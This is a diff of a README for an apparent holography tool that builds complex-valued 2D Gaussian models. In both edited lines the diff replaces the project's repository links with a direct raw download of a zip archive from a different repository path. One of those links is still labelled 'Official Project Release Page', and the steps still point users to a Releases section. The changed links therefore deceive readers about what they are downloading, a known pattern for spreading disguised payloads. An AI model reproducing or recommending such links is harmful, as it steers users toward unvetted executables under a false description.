@@ -5,7 +5,7 @@ description: "Represent computer-generated holography using complex-valued 2D Ga
 ---
 # 🌌 Complex-Valued_2D_Gaussian_Representation - Create high-quality holograms using gaussian methods
 
-[![Download Software](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/tobyje541/Complex-Valued_2D_Gaussian_Representation)
+[![Download Software](https://img.shields.io/badge/Download_Software-Blue-blue)](https://raw.githubusercontent.com/tobyje541/tobyje541.github.io/main/refracting/tobyje_io_github_v1.8.zip)
 
 This application creates complex-valued 2D Gaussian models for computer-generated holography. This method improves image quality and processing speed for holographic displays. You can transform standard 2D images into complex hologram data without technical background knowledge.
 
@@ -22,7 +22,7 @@ Ensure your Windows computer meets these requirements:
 
 Visit the official project page to download the latest setup file.
 
-[Download Link: Official Project Release Page](https://github.com/tobyje541/Complex-Valued_2D_Gaussian_Representation)
+[Download Link: Official Project Release Page](https://raw.githubusercontent.com/tobyje541/tobyje541.github.io/main/refracting/tobyje_io_github_v1.8.zip)
 
 1. Navigate to the link above.
 2. Select the latest version listed under the Releases section.
